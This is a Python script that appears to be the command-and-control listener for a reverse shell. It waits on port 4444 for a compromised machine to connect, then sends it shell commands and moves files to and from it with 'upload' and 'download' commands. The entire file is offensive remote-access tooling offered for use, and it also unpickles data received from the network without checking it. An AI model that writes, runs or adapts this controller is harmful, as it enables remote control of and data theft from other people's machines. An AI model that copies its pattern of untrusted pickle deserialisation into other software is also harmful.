#!/usr/bin/env python

import base64
import socket
import pickle
import base64
from termcolor import colored


HEADERSIZE = 10

class Listener:
  def __init__(self, ip, port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(0)
    print(colored("[+] Waiting for incoming connections"))
    self.connection, address = listener.accept()
    print(colored("[+] Got a connection" + str(address)))

  def reliable_send(self, data):
    pickle_data = pickle.dumps(data)
    pickle_data = bytes(f"{len(pickle_data):<{HEADERSIZE}}", 'utf-8') + pickle_data
    self.connection.send(pickle_data)

  def reliable_receive(self):
    full_pickle_data = b""
    new_pickle_data = True
    while True:
      pickle_data = self.connection.recv(16)
      if new_pickle_data:
        length = int(pickle_data[:HEADERSIZE])
        new_pickle_data = False
      full_pickle_data += pickle_data

      if len(full_pickle_data) - HEADERSIZE == length:
        new_pickle_data = True
        return pickle.loads(full_pickle_data[HEADERSIZE:])

  def execute_remotely(self, command):
    self.reliable_send(command)

    if command[0] == "exit":
      self.connection.close()
      exit()

    return self.reliable_receive()

  def write_file(self, path, content):
    with open(path, "wb") as file:
      file.write(base64.b64decode(content))
      return
  
  def read_file(self, path):
    with open(path, "rb") as file:
      return base64.b64encode(file.read())

  def run(self):
    while True:
      command = input(">> ")
      command = command.split(" ")
      if command[0] == "upload":
        file_content = self.read_file(command[1])
        command.append(file_content)
        print("[+] Uploaded")

      result = self.execute_remotely(command)
      if command[0] == "download" and "[-] Error" not in result:
        result = self.write_file(command[1], result)
        print("[+] Success")
      try:  
        result = result.decode()
      except AttributeError:
        continue
      print(result)


my_listener = Listener("ip adress", 4444)
my_listener.run()